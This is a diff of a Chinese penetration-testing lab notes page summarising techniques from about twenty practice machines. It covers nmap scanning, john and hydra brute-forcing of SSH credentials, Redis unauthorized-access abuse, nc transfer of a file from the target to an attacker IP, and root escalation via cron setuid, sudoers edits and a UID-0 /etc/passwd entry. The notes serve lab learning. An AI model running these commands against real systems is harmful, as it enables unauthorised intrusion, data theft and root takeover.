@@ -7935,52 +7935,52 @@
   <h1>靶机知识汇总</h1>
 
 <h2 id="_1">靶机知识汇总</h2>
-<p>做了二十个靶机了，对学到的知识点做一个汇总
+<p>做了二十个靶机了，对学到的知识点做一个汇总<br />
 一些没啥意思的用 exp 直接打，不计进来</p>
 <h2 id="nmap">nmap</h2>
 <p>首先是 nmap，在做靶机之前，我对于 web 安全的了解仅限于一些基础的 CTF 题目，压根就没用过 nmap，虽然看过几篇介绍 nmap 的文章</p>
-<p>nmap -sC -A -T 4 -n -p- 10.10.10.171
-nmap参数：
--sC    根据端口识别的服务，调用默认脚本
--A     OS识别,版本探测，脚本扫描和traceroute
--T（0-5）时间优化
--n/-R   不对IP进行域名反向解析/为所有的IP都进行域名的反响解析
+<p>nmap -sC -A -T 4 -n -p- 10.10.10.171<br />
+nmap参数：<br />
+-sC    根据端口识别的服务，调用默认脚本<br />
+-A     OS识别,版本探测，脚本扫描和traceroute<br />
+-T（0-5）时间优化<br />
+-n/-R   不对IP进行域名反向解析/为所有的IP都进行域名的反响解析<br />
 -p- 扫描所有端口</p>
 <h2 id="searchsploit">searchsploit</h2>
-<p>searchsploit 是一个命令行搜索 exp 的工具，可以直接在 kali 终端中搜 exp，使用空格来区分关键词
+<p>searchsploit 是一个命令行搜索 exp 的工具，可以直接在 kali 终端中搜 exp，使用空格来区分关键词<br />
 例如：searchsploit opennetadmin</p>
 <p><img alt="1581996328026-dc214837-8f27-4f0e-878e-fcb303093366.png" src="../img/HE5uul6TP2e-UG97/1581996328026-dc214837-8f27-4f0e-878e-fcb303093366-824162.png" /></p>
 <p>加上 -m 可以把 exp 复制到当前目录</p>
 <p><img alt="1581996395447-5b59ff85-e2e8-4a6b-93dd-4f79d752eb5d.png" src="../img/HE5uul6TP2e-UG97/1581996395447-5b59ff85-e2e8-4a6b-93dd-4f79d752eb5d-789397.png" /></p>
 <h2 id="netstat">netstat</h2>
-<p>netstat 各个参数解释
--a (all)显示所有选项，默认不显示LISTEN相关
--t (tcp)仅显示tcp相关选项
--u (udp)仅显示udp相关选项
--n 拒绝显示别名，能显示数字的全部转化成数字
--l 仅列出有在 Listen (监听) 的服務状态
--p 显示建立相关链接的程序名
--r 显示路由信息，路由表
--e 显示扩展信息，例如uid等
--s 按各个协议进行统计
+<p>netstat 各个参数解释<br />
+-a (all)显示所有选项，默认不显示LISTEN相关<br />
+-t (tcp)仅显示tcp相关选项<br />
+-u (udp)仅显示udp相关选项<br />
+-n 拒绝显示别名，能显示数字的全部转化成数字<br />
+-l 仅列出有在 Listen (监听) 的服務状态<br />
+-p 显示建立相关链接的程序名<br />
+-r 显示路由信息，路由表<br />
+-e 显示扩展信息，例如uid等<br />
+-s 按各个协议进行统计<br />
 -c 每隔一个固定时间，执行该netstat命令</p>
 <h2 id="ssh">ssh相关</h2>
 <h3 id="john">john爆破密钥密码</h3>
 <p>用户将自己的公钥存储在远程主机上面，登陆的时候远程主机会向用户发送一段随机字符串，用户用私钥加密之后再将加密后的发送给主机，如果主机能够用公钥解密成功则可以连接</p>
-<p>如果能查看密钥的话可以保存下来，然后用密钥去连接，如果密钥有密码的话，可以使用 ssh2john.py 先转换成 john 格式
+<p>如果能查看密钥的话可以保存下来，然后用密钥去连接，如果密钥有密码的话，可以使用 ssh2john.py 先转换成 john 格式<br />
 <code>python /usr/share/john/ssh2john.py mi &gt; sshjohn</code></p>
-<p>然后使用 john 爆破一下
+<p>然后使用 john 爆破一下<br />
 <code>john --wordlist=/usr/share/wordlists/rockyou.txt sshjohn</code>   使用 john 爆破 --wordlist 指定字典</p>
-<p>john 工具对于同一个 shadow 文件只会进行一次爆破，如果第二次执行 john shadow 是不会得到结果的
+<p>john 工具对于同一个 shadow 文件只会进行一次爆破，如果第二次执行 john shadow 是不会得到结果的<br />
 如果想查看上一次爆破的结果，可以加上个 --show</p>
 <h3 id="hydrassh">hydra爆破ssh</h3>
-<p><code>hydra -l jim -w 10 -P 1.txt -t 10 -v -f 192.168.149.160 ssh</code>
--l jim              指定爆破账号为 jim
--L user.txt       指定用户名字典为 user.txt
--w 10             设置最大超时时间10s，默认30s
--P pwd.txt      指定密码字典为 pwd.txt
--t 10               指定爆破线程为 10 个
--v                   指定显示爆破过程
+<p><code>hydra -l jim -w 10 -P 1.txt -t 10 -v -f 192.168.149.160 ssh</code><br />
+-l jim              指定爆破账号为 jim<br />
+-L user.txt       指定用户名字典为 user.txt<br />
+-w 10             设置最大超时时间10s，默认30s<br />
+-P pwd.txt      指定密码字典为 pwd.txt<br />
+-t 10               指定爆破线程为 10 个<br />
+-v                   指定显示爆破过程<br />
 -f                    查找到第一个可以使用的账号和密码的时候停止破解</p>
 <h3 id="authorized_keys">authorized_keys</h3>
 <p>authorized_keys，里面实际放的就是客户机的公钥，只要公钥在这里面，这个客户机就不用使用密码就能登录</p>
@@ -7991,7 +7991,7 @@ nmap参数：
 <p>如果我把 wsl 的公钥拷出来，放到 ubuntu 用户 yichen 的 .ssh 下 authorized_keys 中，那么将不再需要密码</p>
 <p><img alt="image.png" src="../img/HE5uul6TP2e-UG97/1593955558441-d89eb592-4051-4417-ad31-5c86c9764d6c-488908.png" /></p>
 <p><img alt="image.png" src="../img/HE5uul6TP2e-UG97/1593955584466-e9837ca9-505c-4855-aa44-03d25d68a3d5-650868.png" /></p>
-<p>那么，如果有权限，可以把自己生成的公钥拷到用户的 authorized_keys 中，那么就可以直接 ssh 登录到这个用户
+<p>那么，如果有权限，可以把自己生成的公钥拷到用户的 authorized_keys 中，那么就可以直接 ssh 登录到这个用户<br />
 （那个靶机是允许执行另一个用户的 cp 命令，然后拷贝公钥到 .ssh/authorized_keys，再登录。但感觉实际用不到，会有这么用的？也许吧😄）</p>
 <h2 id="sudo-l">sudo -l</h2>
 <p>sudo -l 可以列出当前用户可以执行哪一些指令，如果有 NOPASSWD 的，就是不需要密码就能使用 sudo 的</p>
@@ -8000,14 +8000,14 @@ nmap参数：
 <p>还有很多软件可以具体找一下他们怎么能开一个 shell，sudo 打开就是 root</p>
 <h2 id="redis">redis未授权访问</h2>
 <p>关于 redis 核心利用点是，<strong>通过没有身份校验的 redis 服务进行登陆</strong>，同时<strong>指定 config dir 和 config dbfilename 的路径与名称</strong>，达到<strong>把本地公钥存储到远程服务器</strong>上，这时候在通过 ssh 进行远程登陆。可以<strong>获得名为 redis 的 shell</strong></p>
-<p>有个利用脚本
+<p>有个利用脚本<br />
 <a href="https://github.com/Avinash-acid/Redis-Server-Exploit">https://github.com/Avinash-acid/Redis-Server-Exploit</a></p>
 <h2 id="python">python交互式终端</h2>
-<p>一般打开的 shell，只有一个 $ 符号，通过这个能好看一下
+<p>一般打开的 shell，只有一个 $ 符号，通过这个能好看一下<br />
 <code>python -c "import pty;pty.spawn('/bin/bash')"</code></p>
 <h2 id="_2">从靶机上拷出东西来</h2>
-<p>(如果有 web 服务的话，直接拷到 web 目录，然后下载应该也可以吧)
-攻击机新开一个终端，<code>nc -lvp 10001 &gt;backup-ssh-identity-files.tgz</code> 用来接收那个压缩包文件
+<p>(如果有 web 服务的话，直接拷到 web 目录，然后下载应该也可以吧)<br />
+攻击机新开一个终端，<code>nc -lvp 10001 &gt;backup-ssh-identity-files.tgz</code> 用来接收那个压缩包文件<br />
 靶机 shell 里面使用 <code>nc 10.10.15.84 10001 &lt; backup-ssh-identity-files.tgz</code></p>
 <h2 id="rbash">rbash逃逸</h2>
 <p>rbash 会限制一些命令没法用，参考：<a href="https://xz.aliyun.com/t/7642">https://xz.aliyun.com/t/7642</a></p>
@@ -8015,36 +8015,36 @@ nmap参数：
 <p>一个命令行下识别 cms 的工具</p>
 <p><img alt="1585657777143-9e7b9e74-e5e7-4244-af00-7bc113bc2069.png" src="../img/HE5uul6TP2e-UG97/1585657777143-9e7b9e74-e5e7-4244-af00-7bc113bc2069-488777.png" /></p>
 <h2 id="docker">docker相关</h2>
-<p>挂载目录：加参数 <code>-v /root/:/root/</code>
+<p>挂载目录：加参数 <code>-v /root/:/root/</code><br />
 在<a href="https://www.yuque.com/hxfqg9/web/fb84x0">这个靶机</a>中拿到用户权限之后可以对 docker 进行操作，而 docker 进去是 root 权限的，docker 挂载上靶机的 root 目录之后就可以 root 权限对 /root 目录进行操作了</p>
 <h2 id="root">当你能root权限写文件</h2>
 <h3 id="linux">写linux计划任务</h3>
-<p>cron 的默认配置文件是 /etc/cronted，#开头的是注释，不会被处理
+<p>cron 的默认配置文件是 /etc/cronted，#开头的是注释，不会被处理<br />
 然后上面的内容是来设置 cron 的运行环境的</p>
 <p><img alt="image.png" src="../img/HE5uul6TP2e-UG97/1593842290106-0be5529e-6f51-4304-aada-17c3820e2f9a-015997.png" /></p>
 <ul>
-<li>表示任意的数，即每分钟、每小时、每天...
+<li>表示任意的数，即每分钟、每小时、每天...<br />
 如果有编辑文件的软件（比如 teehee）是 root 权限运行的话可以写 <code>* * * * * root chmod 4777 /bin/sh</code> 进去，等个一分钟就能获得一个 root 权限的 shell</li>
 </ul>
 <h3 id="etcsudoers">写/etc/sudoers</h3>
-<p>这个东西的作用是当用户执行 sudo 的时候，会先到这里面去找，如果发现用户有 sudo 的权限就能直接以 root 的权限来执行命令
-文件内容公式：<code>授权用户/组 主机=[(切换到哪些用户或组)] [是否需要输入密码验证] 命令1,命令2...</code>
-那么可以往里写 <code>yichen ALL=(ALL:ALL) ALL</code> 这样 yichen 就能通过 sudo 来执行 root 权限
+<p>这个东西的作用是当用户执行 sudo 的时候，会先到这里面去找，如果发现用户有 sudo 的权限就能直接以 root 的权限来执行命令<br />
+文件内容公式：<code>授权用户/组 主机=[(切换到哪些用户或组)] [是否需要输入密码验证] 命令1,命令2...</code><br />
+那么可以往里写 <code>yichen ALL=(ALL:ALL) ALL</code> 这样 yichen 就能通过 sudo 来执行 root 权限<br />
 又或者 peter 可以不使用密码用 sudo 执行任何命令 <code>peter ALL=(ALL) NOPASSWD: ALL</code></p>
 <h3 id="etcpasswd">写/etc/passwd</h3>
-<p>首先要生成 hash
-<code>openssl passwd -1 -salt yichen 123456</code>
-用户名：yichen，密码：123456
-<code>echo 'yichen:$1$yichen$6nzFZVX5T21iu2AmBgzin/:0:0:yichen:/root:/bin/bash' &gt;&gt; /etc/passwd</code>
+<p>首先要生成 hash<br />
+<code>openssl passwd -1 -salt yichen 123456</code><br />
+用户名：yichen，密码：123456<br />
+<code>echo 'yichen:$1$yichen$6nzFZVX5T21iu2AmBgzin/:0:0:yichen:/root:/bin/bash' &gt;&gt; /etc/passwd</code><br />
 然后 su yichen，输入密码：123456 就拿到 root 权限了</p>
 <h2 id="_3">重要/敏感文件</h2>
 <h3 id="nginx">nginx</h3>
-<p>配置文件存放目录：/etc/nginx
-主配置文件：/etc/nginx/conf/nginx.conf 或 /etc/nginx/nginx.conf
-管理脚本：/usr/lib64/systemd/system/nginx.service
-模块：/usr/lisb64/nginx/modules
-应用程序：/usr/sbin/nginx
-程序默认存放位置：/usr/share/nginx/html
+<p>配置文件存放目录：/etc/nginx<br />
+主配置文件：/etc/nginx/conf/nginx.conf 或 /etc/nginx/nginx.conf<br />
+管理脚本：/usr/lib64/systemd/system/nginx.service<br />
+模块：/usr/lisb64/nginx/modules<br />
+应用程序：/usr/sbin/nginx<br />
+程序默认存放位置：/usr/share/nginx/html<br />
 日志默认存放位置：/var/log/nginx</p>
 <blockquote>
 <p>原文: <a href="https://www.yuque.com/hxfqg9/web/gxg68i">https://www.yuque.com/hxfqg9/web/gxg68i</a></p>
